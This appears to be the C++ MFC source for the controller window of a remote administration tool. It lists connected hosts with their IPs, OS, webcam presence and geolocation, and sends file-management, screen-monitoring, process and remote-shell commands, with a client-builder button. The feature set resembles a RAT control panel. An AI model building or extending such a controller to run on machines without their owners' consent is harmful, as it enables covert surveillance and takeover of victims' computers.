
// ServerDlg.cpp : 实现文件
//

#include "stdafx.h"
#include "Server.h"
#include "ServerDlg.h"
#include "..\Common\common.h"



#ifdef _DEBUG
#define new DEBUG_NEW
#endif

#define MYWM_NOTIFYICON       WM_USER+1
#define WM_OPENSHELLDLG       WM_USER+2
#define WM_OPENFILEDLG        WM_USER+3
#define WM_OPENSRCEENDLG      WM_USER+4
#define WM_OPENPROCESSDLG     WM_USER+5
#define WM_ReplyHreat         WM_USER+6
#define WM_AddList            WM_USER+7
#define WM_RemoveList            WM_USER+8

// 用于应用程序“关于”菜单项的 CAboutDlg 对话框
CServerDlg* g_pDlg = NULL;
class CAboutDlg : public CDialogEx
{
public:
    CAboutDlg();

    // 对话框数据
    enum { IDD = IDD_ABOUTBOX };

protected:
    virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV 支持

    // 实现
protected:
    DECLARE_MESSAGE_MAP()
public:
    
};

CAboutDlg::CAboutDlg() : CDialogEx(CAboutDlg::IDD)
{
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
    CDialogEx::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialogEx)
    
END_MESSAGE_MAP()


// CServerDlg 对话框
//状态栏
static UINT indicators[] =
{
    ID_STAUTSTIP,           // status line indicator
    ID_STAUTSSPEED,
    ID_STAUTSPORT,
    ID_STAUTSCOUNT
};
//列表信息结构体
struct COLUMNSTRUCT
{
    TCHAR*   title;
    int     nWidth;
};
//列表数组
COLUMNSTRUCT g_Column_Data[] =
{
    { TEXT("ID"), 60 },
    { TEXT("WAN"), 120 },
    { TEXT("LAN"), 120 },
    { TEXT("计算机名/备注"), 120 },
    { TEXT("操作系统"), 140 },
    { TEXT("CPU"), 70 },
    { TEXT("Ping"), 50 },
    { TEXT("摄像头"), 60 },
    { TEXT("地理位置"), 120 }
};
int g_Column_Width = 0;
int	g_Column_Count = (sizeof(g_Column_Data) / 8);

CServerDlg::CServerDlg(CWnd* pParent /*=NULL*/)
	: CDialogEx(CServerDlg::IDD, pParent)
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CServerDlg::DoDataExchange(CDataExchange* pDX)
{
    CDialogEx::DoDataExchange(pDX);
    DDX_Control(pDX, IDC_LIST1, m_ListCtrl);
}

BEGIN_MESSAGE_MAP(CServerDlg, CDialogEx)
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
    ON_COMMAND(1001, OnFileManage)
    ON_COMMAND(1002, OnScreen)
    ON_COMMAND(1003, OnProcess)
    ON_COMMAND(1004, OnShellMange)
    ON_COMMAND(1005, OnSoftSet)
    ON_COMMAND(1006, OnCamera)
    ON_COMMAND(1007, OnCamera)
    ON_COMMAND(1008, OnCamera)
    ON_COMMAND(1009, OnCamera)
    ON_COMMAND(1010, OnCamera)
    ON_COMMAND(1011, OnAboutDlg)
    ON_COMMAND(1012, OnExit)
    ON_COMMAND(ID_ABOUT, OnAboutDlg)
    ON_COMMAND(ID_Exit, OnExit)
    ON_NOTIFY(NM_RCLICK, IDC_LIST1, &CServerDlg::OnRclickList1)
    //右键菜单消息
    ON_COMMAND(BN_FILEMANAGE, OnFileManage)
    ON_COMMAND(MN_Uninstall, &CServerDlg::OnUninstall)
    ON_WM_TIMER()
    ON_MESSAGE(WM_OPENSHELLDLG, &CServerDlg::OnOpenshelldlg)
    ON_MESSAGE(WM_OPENFILEDLG, &CServerDlg::OnOpenfiledlg)
    ON_MESSAGE(WM_OPENSRCEENDLG, &CServerDlg::OnOpensrceendlg)
    ON_MESSAGE(WM_OPENPROCESSDLG, &CServerDlg::OnOpenprocessdlg)
    ON_MESSAGE(WM_ReplyHreat, &CServerDlg::OnReplyhreat)
    ON_MESSAGE(WM_AddList, &CServerDlg::OnAddlist)
    ON_MESSAGE(WM_RemoveList, &CServerDlg::OnRemovelist)
    
END_MESSAGE_MAP()


// CServerDlg 消息处理程序

BOOL CServerDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// 设置此对话框的图标。  当应用程序主窗口不是对话框时，框架将自动
	//  执行此操作
	SetIcon(m_hIcon, TRUE);			// 设置大图标
	SetIcon(m_hIcon, FALSE);		// 设置小图标

	// TODO:  在此添加额外的初始化代码
    g_pDlg = this;
    //系统托盘
    AddSystrayIcon();
    //创建列表框
    DWORD dwStyle = m_ListCtrl.GetExtendedStyle();
    m_ListCtrl.SetExtendedStyle(dwStyle | LVS_EX_FLATSB | LVS_EX_FULLROWSELECT | LVS_EX_GRIDLINES/* | LVS_EX_CHECKBOXES*/);
    for (int i = 0; i < g_Column_Count; i++)
    {
        m_ListCtrl.InsertColumn(i, g_Column_Data[i].title);
        m_ListCtrl.SetColumnWidth(i, g_Column_Data[i].nWidth);
        g_Column_Width += g_Column_Data[i].nWidth; // 总宽度
    }
    m_QQwry = NULL;
    //访问父类成员 判断文件是否存在
    if (((CServerApp*)AfxGetApp())->m_bIsQQwryExist)
    {
        m_QQwry = new SEU_QQwry;
        m_QQwry->SetPath(TEXT("QQWry.Dat"));
    }
    //创建图像列表控件
    m_ImageList.Create(30, 30, ILC_COLOR32 | ILC_MASK, 1, 1);
    //向图像列表空间加载图标
    m_ImageList.Add(AfxGetApp()->LoadIcon(IDI_File));//0
    m_ImageList.Add(AfxGetApp()->LoadIcon(IDI_PMJK));//1
    m_ImageList.Add(AfxGetApp()->LoadIcon(IDI_JPJL));//2
    m_ImageList.Add(AfxGetApp()->LoadIcon(IDI_CMD));//6
    m_ImageList.Add(AfxGetApp()->LoadIcon(IDI_RJSZ));//8
    m_ImageList.Add(AfxGetApp()->LoadIcon(IDI_SCCX));//9
    m_ImageList.Add(AfxGetApp()->LoadIcon(IDI_XTGL));//3
    m_ImageList.Add(AfxGetApp()->LoadIcon(IDI_SPJK));//4
    m_ImageList.Add(AfxGetApp()->LoadIcon(IDI_YYJT));//5
    m_ImageList.Add(AfxGetApp()->LoadIcon(IDI_KQDL));//7
    m_ImageList.Add(AfxGetApp()->LoadIcon(IDI_ABOUT));//10
    m_ImageList.Add(AfxGetApp()->LoadIcon(IDI_CLOSE));//11

    //创建工具栏
    UINT array[12];
    for (int i = 0; i < 12;i++)
    {
        array[i] = i + 1001;
    }
    m_ToolBar.Create(this);
    m_ToolBar.SetButtons(array, 12);
    m_ToolBar.SetButtonText(0, TEXT("文件管理"));
    m_ToolBar.SetButtonText(1, TEXT("屏幕监控"));
    m_ToolBar.SetButtonText(2, TEXT("进程管理"));
    m_ToolBar.SetButtonText(3, TEXT("超级终端"));
    m_ToolBar.SetButtonText(4, TEXT("软件设置"));
    m_ToolBar.SetButtonText(5, TEXT("生成程序"));
    m_ToolBar.SetButtonText(6, TEXT("等待添加"));
    m_ToolBar.SetButtonText(7, TEXT("等待添加"));
    m_ToolBar.SetButtonText(8, TEXT("等待添加"));
    m_ToolBar.SetButtonText(9, TEXT("等待添加"));
    m_ToolBar.SetButtonText(10, TEXT("关于程序"));
    m_ToolBar.SetButtonText(11, TEXT("退出程序"));

    //关联图像列表
    m_ToolBar.GetToolBarCtrl().SetImageList(&m_ImageList);
    //设置按钮和图标的大小
    m_ToolBar.SetSizes(CSize(70, 70), CSize(30, 30));
    RepositionBars(AFX_IDW_CONTROLBAR_FIRST, AFX_IDW_CONTROLBAR_LAST, 0);

    //状态栏
    m_StatusBar.Create(this);
    m_StatusBar.SetIndicators(indicators, sizeof(indicators) / sizeof(UINT));
    m_StatusBar.SetPaneInfo(0, m_StatusBar.GetItemID(0), SBPS_STRETCH, NULL);
    m_StatusBar.SetPaneInfo(1, m_StatusBar.GetItemID(1), SBPS_NORMAL, 160);
    m_StatusBar.SetPaneInfo(2, m_StatusBar.GetItemID(2), SBPS_NORMAL, 100);
    m_StatusBar.SetPaneInfo(3, m_StatusBar.GetItemID(3), SBPS_NORMAL, 100);
    m_StatusBar.SetPaneText(0, _T("欢迎使用企业服务器管理软件！"));
    m_StatusBar.SetPaneText(1, CTime::GetCurrentTime().Format(_T("%Y-%m-%d %H:%M:%S")));
    m_StatusBar.SetPaneText(3, _T("当前连接:0台"));
    RepositionBars(AFX_IDW_CONTROLBAR_FIRST, AFX_IDW_CONTROLBAR_LAST, 0); //显示状态栏	
    SetTimer(1, 500, NULL); //状态栏时间显示时钟
    ::GetPrivateProfileString(_T("配置"), _T("PORT"), _T("2018"), m_csPort.GetBuffer(MAXBYTE), MAXBYTE, _T("./config.ini"));
    m_csPort.ReleaseBuffer();
    m_StatusBar.SetPaneText(2, _T("上线端口:") + m_csPort);
    //初始化IOCP
    m_IOCPServer = new CIOCPServer;
    m_IOCPServer->Initialize(NotifyProc, 1000, _wtoi(m_csPort));
	return TRUE;  // 除非将焦点设置到控件，否则返回 TRUE
}

// 如果向对话框添加最小化按钮，则需要下面的代码
//  来绘制该图标。  对于使用文档/视图模型的 MFC 应用程序，
//  这将由框架自动完成。

void CServerDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // 用于绘制的设备上下文

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// 使图标在工作区矩形中居中
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// 绘制图标
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialogEx::OnPaint();
	}
}

//当用户拖动最小化窗口时系统调用此函数取得光标
//显示。
HCURSOR CServerDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}
//文件管理
void CServerDlg::OnFileManage()
{
    char Type = COMMAND_DIR;
    SelectComamndSend(&Type, sizeof(char));
}

void CServerDlg::OnScreen()
{
    char Type = COMMAND_Screen;
    SelectComamndSend(&Type, sizeof(char));
}

//摄像头
void CServerDlg::OnCamera()
{
    CString str;
    str = __FUNCTION__;
    MessageBox(str, TEXT("提示"), 0);

}
//进程
void CServerDlg::OnProcess()
{
    char Type = COMMAND_PROCESS;
    SelectComamndSend(&Type, sizeof(char));
}
//cmd
void CServerDlg::OnShellMange()
{
    char Type = COMMAND_CMD;
    SelectComamndSend(&Type, sizeof(char));
}

//软件设置
void CServerDlg::OnSoftSet()
{
    CSoftDlg* pDlg = new CSoftDlg;
    if (pDlg->DoModal()==IDOK)
    {
        this->m_csPort = pDlg->m_csPort;
    }
    delete pDlg;
}
//关于
void CServerDlg::OnAboutDlg()
{
    CAboutDlg* pDlg = new CAboutDlg;
    pDlg->DoModal();
    delete pDlg;
}
//卸载
void CServerDlg::OnUninstall()
{
    // TODO:  在此添加命令处理程序代码
    char Type = COMMAND_Stop;
    SelectComamndSend(&Type, sizeof(char));
}

LRESULT CServerDlg::WindowProc(UINT message, WPARAM wParam, LPARAM lParam)
{
    // TODO: 在此添加专用代码和/或调用基类
    switch (message)
    {
    case MYWM_NOTIFYICON:
        if (lParam == WM_LBUTTONDBLCLK)
        {
            AfxGetApp()->m_pMainWnd->ShowWindow(SW_SHOW);
        }
        else if (lParam == WM_RBUTTONDOWN)
        {
            CMenu menu;
            //载入事先定义的选单
            menu.LoadMenu(MN_TUOPAN);
            CMenu*pMenu = menu.GetSubMenu(0);
            CPoint pos;
            GetCursorPos(&pos);
            //加入SetForegroundWindow的目的为使用户点菜单之外时菜单可以消失
            ::SetForegroundWindow(m_hWnd);
            pMenu->TrackPopupMenu(TPM_LEFTALIGN | TPM_RIGHTBUTTON, pos.x, pos.y,this);
        }
        break;
    case WM_SYSCOMMAND:
        if (wParam == SC_CLOSE || wParam == SC_MINIMIZE)
        {
            TRACE("处理系统命令\n");
            ShowWindow(SW_HIDE);
            return 0;
        }
        break;
    }
    return CDialogEx::WindowProc(message, wParam, lParam);
}

//创建托盘
void CServerDlg::AddSystrayIcon()
{
    // 将图标放入系统托盘
    g_nd.cbSize = sizeof(NOTIFYICONDATA);
    g_nd.hWnd = m_hWnd;
    g_nd.uID = IDR_MAINFRAME;
    g_nd.uFlags = NIF_ICON | NIF_MESSAGE | NIF_TIP;
    g_nd.uCallbackMessage = MYWM_NOTIFYICON;
    g_nd.hIcon = m_hIcon;
    lstrcpy(g_nd.szTip, TEXT("Server[V1.1]"));
    Shell_NotifyIcon(NIM_ADD, &g_nd);
}
//托盘销毁
void CServerDlg::DelSystrayIcon(void)
{
    Shell_NotifyIcon(NIM_DELETE, &g_nd);
}
//托盘退出
void CServerDlg::OnExit()
{
    DelSystrayIcon();
    AfxGetMainWnd()->SendMessage(WM_CLOSE);
}


//////////////////////////////////////////////////////////////////////////
void CServerDlg::StartServer()
{
}
//socket清空处理
void CServerDlg::Stop()
{
    
}


void CServerDlg::OnRclickList1(NMHDR *pNMHDR, LRESULT *pResult)
{
    LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);
    // TODO:  在此添加控件通知处理程序代码
    NMLISTVIEW *pNMListView = (NMLISTVIEW*)pNMHDR;  //这行多余
    //如果没有选中就不弹出邮件菜单
    if (pNMListView->iItem == -1)
    {
        //return;
    }
    CMenu menu;
    //载入事先定义的选单
    menu.LoadMenu(MN_YOUJIAN);
    CMenu*pMenu = menu.GetSubMenu(0);
    CPoint pos;
    GetCursorPos(&pos);
    //加入SetForegroundWindow的目的为使用户点菜单之外时菜单可以消失
    ::SetForegroundWindow(m_hWnd);
    pMenu->TrackPopupMenu(TPM_LEFTALIGN, pos.x, pos.y,this);

    *pResult = 0;
}



void CServerDlg::OnTimer(UINT_PTR nIDEvent)
{
    // TODO:  在此添加消息处理程序代码和/或调用默认值
    switch (nIDEvent)
    {
    case 1:
    {
        m_StatusBar.SetPaneText(1, CTime::GetCurrentTime().Format(_T("%Y-%m-%d %H:%M:%S")));
        int nCount = m_ListCtrl.GetItemCount();
        CString csTemp;
        csTemp.Format(_T("当前连接:%d台"), nCount);
        m_StatusBar.SetPaneText(3, csTemp);
        break;
    }
    default:
        break;
    }
    CDialogEx::OnTimer(nIDEvent);
}

void CALLBACK CServerDlg::NotifyProc(LPVOID lpParam, tagClientContext* pContext, UINT nCode)
{
    switch (nCode)
    {
    case NC_CLIENT_CONNECT:
        //Dbgprintf("有主机上线%s", inet_ntoa(pContext->addr.sin_addr));
        break;
    case NC_CLIENT_DISCONNECT://阻塞  返回才释放socket
        g_pDlg->SendMessage(WM_RemoveList, (WPARAM)pContext, NULL);
        Dbgprintf("有主机下线%s", inet_ntoa(pContext->addr.sin_addr));
        break;
    case NC_TRANSMIT:
        //Dbgprintf("有发送消息%s", inet_ntoa(pContext->addr.sin_addr));
        break;
    case NC_RECEIVE:
        //Dbgprintf("接收消息%s", inet_ntoa(pContext->addr.sin_addr));
        break;
    case NC_RECEIVE_COMPLETE:
    {
        //Dbgprintf("消息解压完成%s", inet_ntoa(pContext->addr.sin_addr));
        g_pDlg->ProcessMessage(pContext);
    }
        break;
    default:
        break;
    }

}

void CServerDlg::ProcessMessage(tagClientContext* pContext)
{
    if (pContext == NULL)
    {
        return;
    }
    switch (pContext->m_CompressBuffer.GetBuffer()[0])
    {
    case TOKEN_LOGIN:
        SendMessage(WM_AddList, (WPARAM)pContext, NULL);
        break;
    case COMMAND_CMD_OPEN:
        SendMessage(WM_OPENSHELLDLG, (WPARAM)pContext, NULL);
        break;
    case COMMAND_OPEN_FILEDLG:
        SendMessage(WM_OPENFILEDLG, (WPARAM)pContext, NULL);
        break;
    case COMMAND_Screen_OPEN:
        SendMessage(WM_OPENSRCEENDLG, (WPARAM)pContext, NULL);
        break;
    case COMMAND_PROCESS_OPEN:
        SendMessage(WM_OPENPROCESSDLG, (WPARAM)pContext, NULL);
        break;
    case COMMAND_HEARTBEAT:
        SendMessage(WM_ReplyHreat, (WPARAM)pContext, NULL);
        break;
    default:
        break;
    }
    CDialog	*dlg = (CDialog	*)pContext->m_Dialog[1];
    //判断消息是不是窗口的 
    if (pContext->m_Dialog[0] > 0)
    {
        switch (pContext->m_Dialog[0])
        {
        case Shell_Dlg:
            ((CShellDlg*)dlg)->OnReceive();
            break;
        case File_Dlg:
            ((CFileDlg*)dlg)->OnReceive();
            break;
        case Screen_Dlg:
            ((CScreenDlg*)dlg)->OnReceive();
            break;
        case Process_Dlg:
            ((CProcessDlg*)dlg)->OnReceive();
            break;
        default:
            break;
        }
    }

}


void CServerDlg::SelectComamndSend(char*  pBuffer, int nSize)
{
    int nIndex = m_ListCtrl.GetSelectionMark();
    if (nIndex == -1 )
    {
        return;
    }
    SOCKET s = (SOCKET)m_ListCtrl.GetItemData(nIndex);
    tagClientContext* pClientContext = m_IOCPServer->m_pClientManager->GetClient(s);
    m_IOCPServer->Send(pClientContext, pBuffer, nSize);
}

afx_msg LRESULT CServerDlg::OnOpenshelldlg(WPARAM wParam, LPARAM lParam)
{
    tagClientContext* pContext = (tagClientContext*)wParam;
    CShellDlg* pShellDlg = new CShellDlg(this,m_IOCPServer,pContext);
    pShellDlg->Create(ShellDlg);
    pShellDlg->ShowWindow(SW_SHOW);
    pContext->m_Dialog[0] = Shell_Dlg;
    pContext->m_Dialog[1] = (DWORD)pShellDlg;
    pShellDlg->OnSend();
    return 0;
}


afx_msg LRESULT CServerDlg::OnOpenfiledlg(WPARAM wParam, LPARAM lParam)
{
    tagClientContext* pContext = (tagClientContext*)wParam;
    CFileDlg* pFileDlg = new CFileDlg(this, m_IOCPServer, pContext);
    pFileDlg->Create(FileDlg);
    pFileDlg->ShowWindow(SW_SHOW);
    pContext->m_Dialog[0] = File_Dlg;
    pContext->m_Dialog[1] = (DWORD)pFileDlg;
    pFileDlg->OnSend();
    return 0;
}


afx_msg LRESULT CServerDlg::OnOpensrceendlg(WPARAM wParam, LPARAM lParam)
{
    tagClientContext* pContext = (tagClientContext*)wParam;
    CScreenDlg* pScreenDlg = new CScreenDlg(this, m_IOCPServer, pContext);
    pScreenDlg->Create(ScreenDlg);
    pScreenDlg->ShowWindow(SW_SHOW);
    pContext->m_Dialog[0] = Screen_Dlg;
    pContext->m_Dialog[1] = (DWORD)pScreenDlg;
    pScreenDlg->OnSend();
    return 0;
}


afx_msg LRESULT CServerDlg::OnOpenprocessdlg(WPARAM wParam, LPARAM lParam)
{
    tagClientContext* pContext = (tagClientContext*)wParam;
    CProcessDlg* pProcessDlg = new CProcessDlg(this, m_IOCPServer, pContext);
    pProcessDlg->Create(ProcessDlg);
    pProcessDlg->ShowWindow(SW_SHOW);
    pContext->m_Dialog[0] = Process_Dlg;
    pContext->m_Dialog[1] = (DWORD)pProcessDlg;
    pProcessDlg->OnSend();
    return 0;
}


BOOL CServerDlg::DestroyWindow()
{
    // TODO:  在此添加专用代码和/或调用基类
    delete m_QQwry;
    delete m_IOCPServer;
    return CDialogEx::DestroyWindow();
}


afx_msg LRESULT CServerDlg::OnReplyhreat(WPARAM wParam, LPARAM lParam)
{
    tagClientContext* pContext = (tagClientContext*)wParam;
    char Type = COMMAND_HEARTBEAT;
    m_IOCPServer->Send(pContext, &Type, sizeof(Type));
    Dbgprintf("回复心跳包");
    return 0;
}


afx_msg LRESULT CServerDlg::OnAddlist(WPARAM wParam, LPARAM lParam)
{
    tagClientContext* pContext = (tagClientContext*)wParam;
    LOGININFO LoginInfo = { 0 };
    pContext->m_CompressBuffer.Read((PBYTE)&LoginInfo, sizeof(LOGININFO));
    int nID = m_ListCtrl.GetItemCount();
    m_ListCtrl.InsertItem(nID, _T(""));
    //有登录信息的是主线程
    pContext->m_Ismain = true;
    //id
    CString str;
    str.Format(_T("%d"), nID);
    m_ListCtrl.SetItemText(nID, 0, str);

    //外网IP
    char szIp[16] = { 0 };
    memcpy(szIp, inet_ntoa(pContext->addr.sin_addr), strlen(inet_ntoa(pContext->addr.sin_addr)));
    wstring wstr = AsciiToUnicode(szIp);
    m_ListCtrl.SetItemText(nID, 1, wstr.c_str());

    //内网IP
    wstr = AsciiToUnicode(LoginInfo.szIP);
    m_ListCtrl.SetItemText(nID, 2, wstr.c_str());

    //主机名
    wstr = AsciiToUnicode(LoginInfo.HostName);
    m_ListCtrl.SetItemText(nID, 3, wstr.c_str());

    //操作系统
    wstr = AsciiToUnicode(LoginInfo.szOSver);
    m_ListCtrl.SetItemText(nID, 4, wstr.c_str());
    //CPU
    str.Format(_T("%d"), LoginInfo.CPUClockMhz);
    m_ListCtrl.SetItemText(nID, 5, str);
    //pingSpeed
    str.Format(_T("%d"), LoginInfo.dwSpeed);
    m_ListCtrl.SetItemText(nID, 6, str);
    //摄像头
    str = LoginInfo.bIsWebCam ? _T("有") : _T("无");
    m_ListCtrl.SetItemText(nID, 7, str);
    //地理位置
    str = inet_ntoa(pContext->addr.sin_addr);
    if (m_QQwry != NULL)
    {
        str = m_QQwry->IPtoAdd(str);
        m_ListCtrl.SetItemText(nID, 8, str);
    }
    //保存socket
    m_ListCtrl.SetItemData(nID, (DWORD)pContext->s);
    return 0;
}


afx_msg LRESULT CServerDlg::OnRemovelist(WPARAM wParam, LPARAM lParam)
{
    tagClientContext* pContext = (tagClientContext*)wParam;
    int n = m_ListCtrl.GetItemCount();
    DWORD dwSocket = 0;
    for (int i = 0; i < n; i++)
    {
        dwSocket = m_ListCtrl.GetItemData(i);
        if (dwSocket == (DWORD)pContext->s)
        {
            m_ListCtrl.DeleteItem(i);
        }
    }
    return 0;
}



